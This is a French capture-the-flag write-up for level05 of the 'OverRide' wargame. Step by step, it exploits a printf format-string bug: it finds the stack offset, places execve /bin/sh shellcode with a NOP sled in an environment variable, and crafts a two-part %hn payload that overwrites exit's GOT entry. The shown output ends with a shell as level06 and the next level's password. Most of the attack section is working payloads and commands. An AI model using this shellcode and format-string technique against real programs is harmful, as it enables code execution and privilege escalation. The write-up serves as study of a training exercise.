#### Etape 1 : Décompilation 
```bash
level05@OverRide:~$ ./level05 
dasdas
dasdas
level05@OverRide:~$ ./level05 
AAAAAAA
aaaaaaa
level05@OverRide:~$ ./level05 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaalevel05@OverRide:~$level05@OverRide:~$ ./level05 
1111111112222222
1111111112222222
```

Le binaire prend une chaine de caractere et la convertie en minuscule.

#### Etape 2 : Recherche de faille

On peut voir que le binaire utilise la fonction fgets() pour lire l'input de l'utilisateur. elle limite l'input a 100 caractere.

On voit auusi une fonction printf qui prend directement une variable de l'utilisateur. Qui comme vu dans les exercices précédents peut être une faille de sécurité.

```c
printf((char *)local_78);
```

```bash
Un code tel que printf(foo); indique souvent un bogue, car foo peut contenir un caractère « % ». Si foo vient d'une saisie non sécurisée, il peut contenir %n, ce qui autorise printf() à écrire dans la mémoire, et crée une faille de sécurité.
```



#### Etape 3 : Idée
On decide d'utiliser la faille printf pour écrire dans la mémoire et modifier l'adresse de retour de la fonction exit.

Premierement on recherche l'offset du buffer dans la pile.

```bash
level05@OverRide:~$ echo $(python -c 'print "AAAA" + "%x " * 30' ) > /tmp/testoffset
level05@OverRide:~$ (cat /tmp/testoffset -) |./level05 
aaaa64 f7fcfac0 f7ec3af9 ffffd4ef ffffd4ee 0 ffffffff ffffd574 f7fdb000 61616161 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078
```
On peut voir que l'offset est de 10.

On sait donc que l'on pourra reecrire le shellcode a la position 10.

Pour l'exploiter on va stocker un SHELLCODE dans une variable d'environnement et trouver sa position dans la pile.
pour cela on va utiliser un programme qui va afficher l'adresse de la variable SHELLCODE (voir getenv.c)
et stoker le Shellcode suivan dans la variable SHELLCODE.

```bash
"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
```

```bash
evel05@OverRide:~$ export SHELLCODE=$(python -c 'print "\x90" * 500 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
level05@OverRide:~$ gcc -m32 -o /tmp/getenv /tmp/getenv.c
level05@OverRide:~$ cd /tmp
level05@OverRide:/tmp$ ./getenv 
Adresse de SHELLCODE: 0xffffd70b
```
Nous retrouvons l'adresse de notre SHELLCODE dans la pile : ici 0xffffd70b
0xffffd70b en decimal est 4294956811

Ensuite on va chercher l'adresse de la fonction exit dans la pile ainsi que l'adresse du system.

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) disass main
Dump of assembler code for function main:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
[...]
---Type <return> to continue, or q <return> to quit---
   0x08048513 <+207>:   call   0x8048370 <exit@plt>
(gdb) x/i 0x8048370
   0x8048370 <exit@plt>:        jmp    *0x80497e0
```
nous avons donc l'adresse de exit : 0x80497e0 et de system : 0xf7e6aed0

Dans l'idee nous voulons ecrire l'exploit suivant :

```bash
'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%4294956811x%10$hn"') > /tmp/testlv
```
mais nous avons un probleme, le nombre de caractere a ecrire est trop grand pour etre ecrit en une seule fois.
Nous allons donc devoir ecrire en deux fois.

```bash
0xffffd70b = 4294956811
ffff = 65535
d70b = 55051
```
Donc en little endian le SHELLCODE sera ecrit en deux fois : 55051 puis 65535
Et nous devons stocker dans l'espace correcte entre les deux ecritures le nombre de caractere ecrits.
donc 65535 - 55051 = 10484
mais vu que nous avons 8 bytes ecris avant le SHELLCODE, nous devons commencer à 55043 puis 10484

```bash
level05@OverRide:~$ echo $(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55043x%10$hn"+ "%10484x%11$hn"') > /tmp/testlv
```

Vu que nous avons diviser notre adresse en deux, nous avions besoin de deux %hn pour ecrire l'adresse complete aux 10 et 11 eme positions.

#### Etape 4 : Execution 

```bash
level05@OverRide:~$ export SHELLCODE=$(python -c 'print "\x90" * 500 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
level05@OverRide:~$ gcc -m32 -o /tmp/getenv /tmp/getenv.c
level05@OverRide:~$ cd /tmp
level05@OverRide:/tmp$ ./getenv 
Adresse de SHELLCODE: 0xffffd70b
level05@OverRide:/tmp$ cd 
level05@OverRide:~$ echo $(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55043x%10$hn"+ "%10484x%11$hn"') > /tmp/testlv
5
level05@OverRide:~$ (cat /tmp/testlv5 -) |./level05 
[...]
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```


